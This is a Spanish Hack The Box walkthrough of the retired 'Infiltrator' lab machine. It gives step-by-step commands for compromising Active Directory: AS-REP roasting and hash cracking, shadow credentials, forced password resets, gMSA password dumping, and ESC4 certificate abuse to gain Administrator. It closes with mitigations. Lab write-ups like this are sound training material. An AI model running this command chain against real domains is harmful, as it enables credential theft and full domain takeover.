---
machine: Infiltrator
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, as-rep-roast, kerberos, bloodhound, output-messenger, pcap, bitlocker, gmsa, adcs, esc4, privesc]
---

# Infiltrator — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web publica nombres de empleados; con `username-anarchy` y `kerbrute` se descubre el formato de usuario. `l.clark` no requiere preautenticación Kerberos y cae en un AS-REP roast. BloodHound muestra que `d.anderson` controla la OU y permite obtener `e.rodriguez`, que puede cambiar la contraseña de `m.harris`; esa shell abre Output Messenger y la enumeración de usuarios revela la contraseña de `k.turner`, y de un ejecutable del chat (`UserExplorer.exe`) se extraen credenciales de `winrm_svc`. La API de Output Messenger conduce a la cuenta de `o.martinez`; un PCAP y una copia de BitLocker en sus archivos dan acceso a `lan_managment`, que puede leer la contraseña de la gMSA `infiltrator_svc$`. Esa cuenta tiene permisos peligrosos sobre una plantilla ADCS (ESC4); modificándola y solicitando un certificado como Administrator se obtiene el hash final y el control del dominio.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 <IP>
```

- Controlador de dominio `DC01.infiltrator.htb`: DNS, Kerberos, LDAP, SMB y RPC.
- `80`: web corporativa.
- `3389`: RDP; `5985`: WinRM.

La web lista siete personas. Se generan variantes con `username-anarchy` y se validan contra Kerberos:

```bash
kerbrute userenum -d infiltrator.htb usernames.txt --dc infiltrator.htb
```

## Enumeración

`l.clark` tiene `UF_DONT_REQUIRE_PREAUTH`; se solicita su AS-REP y se crackea:

```bash
GetNPUsers.py infiltrator.htb/ -dc-ip <IP> -usersfile valid_users
hashcat -m 18200 l.clark.hash /usr/share/wordlists/rockyou.txt
```

La contraseña se prueba contra el resto de usuarios: `d.anderson` y `m.harris` la reutilizan, pero responden `STATUS_ACCOUNT_RESTRICTION`. Ambos están en Protected Users y no aceptan NTLM; con Kerberos la autenticación funciona:

```bash
netexec smb infiltrator.htb -u d.anderson -p '<PASSWORD>' -k --shares
```

Se recoge BloodHound:

```bash
bloodhound-python -c All -d infiltrator.htb -u l.clark -p '<PASSWORD>' -ns <IP> --zip
```

## Foothold

BloodHound muestra que `d.anderson` tiene `GenericAll` sobre la OU `MARKETING DIGITAL`. Se modifica la herencia para controlar a sus usuarios y se añade un shadow credential a `e.rodriguez`:

```bash
dacledit.py -action write -rights FullControl -inheritance \
  -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" \
  'infiltrator.htb/d.anderson:<PASSWORD>' -dc-ip infiltrator.htb
certipy shadow auto -k -target dc01.infiltrator.htb -account e.rodriguez
```

El shadow credential devuelve el hash de `e.rodriguez`. Esa cuenta puede cambiar la contraseña de `m.harris`; tras el cambio se obtiene WinRM:

```bash
changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb \
  -althash :<NTHASH> -reset -dc-ip dc01.infiltrator.htb \
  -newpass '<NEW_PASSWORD>' -altuser e.rodriguez
netexec winrm <IP> -u m.harris -p '<NEW_PASSWORD>'
```

## Movimiento lateral

Output Messenger está instalado y escucha en los puertos `14121-14124`. La enumeración de usuarios revela la contraseña de `k.turner`, que permite entrar en Output Messenger. En los archivos compartidos aparece `UserExplorer.exe`; al reversearlo con dnSpy se ve que descifra una contraseña de `winrm_svc` con una clave AES embebida:

```text
UserExplorer.exe -default
```

Con esa cuenta se obtiene otra shell. La API de Output Messenger (`14125`) se alcanza por un túnel Chisel; con la API key se listan salas y usuarios. La funcionalidad de calendario permite ejecución y una shell como `o.martinez`.

## Escalada de privilegios

En los archivos recibidos por `o.martinez` hay un PCAP y una copia de BitLocker. El PCAP aporta credenciales y la copia se monta con `dislocker`; del NTDS se obtiene la contraseña de `lan_managment`, que puede iniciar sesión en el DC.

BloodHound indica que `lan_managment` tiene `ReadGMSAPassword` sobre `infiltrator_svc$`:

```bash
gMSADumper.py -u lan_managment -p '<PASSWORD>' -d infiltrator.htb
```

Con el hash de la gMSA se enumera ADCS:

```bash
netexec ldap infiltrator.htb -u 'infiltrator_svc$' -H <HASH> -M adcs
```

La plantilla `Infiltrator_Template` permite ESC4: la cuenta puede modificar sus permisos, habilitar autenticación de cliente y solicitar un certificado en nombre de Administrator. Se actualiza la plantilla, se pide el certificado y se usa PKINIT para obtener el hash de Administrator:

```bash
certipy template -u 'infiltrator_svc$' -hashes :<HASH> -template Infiltrator_Template -save-old
certipy req -u 'infiltrator_svc$' -hashes :<HASH> -ca infiltrator-DC01-CA -template Infiltrator_Template -upn administrator@infiltrator.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

## Evidencia

- Usuarios válidos por Kerberos y AS-REP de `l.clark` crackeado.
- BloodHound con el cambio de contraseña sobre `m.harris`.
- Output Messenger, credenciales en el chat y `UserExplorer.exe` con la clave AES.
- API de Output Messenger y ejecución por el calendario.
- PCAP, BitLocker y `ReadGMSAPassword` sobre `infiltrator_svc$`.
- ESC4 en `Infiltrator_Template` y certificado de Administrator.

## Lecciones aprendidas

- Los nombres publicados permiten construir usuarios válidos.
- La preautenticación Kerberos deshabilitada expone hashes crackeables.
- Un permiso `ForceChangePassword` encadena cuentas sin crackear nada.
- Los chats y ejecutables internos filtran credenciales y claves.
- Un PCAP y una copia de BitLocker pueden contener el siguiente salto.
- `ReadGMSAPassword` y ESC4 convierten una cuenta de servicio en Domain Admin.

## Mitigaciones y detección

- Exigir preautenticación Kerberos y revisar cuentas con la bandera deshabilitada.
- Auditar ACLs peligrosas (`ForceChangePassword`, `GenericAll`) y reducir su alcance.
- Proteger Output Messenger, sus archivos y sus API keys; segmentar sus puertos.
- Cifrar secretos con DPAPI o un vault y no incrustar claves en ejecutables.
- Rotar contraseñas de gMSA y auditar `ReadGMSAPassword`.
- Revisar plantillas ADCS (ESC1-ESC8), permisos de inscripción y emitir con aprobación.

## Referencias

- [0xdf — Infiltrator](https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html)
- [Hack The Box — Infiltrator](https://app.hackthebox.com/machines/infiltrator)
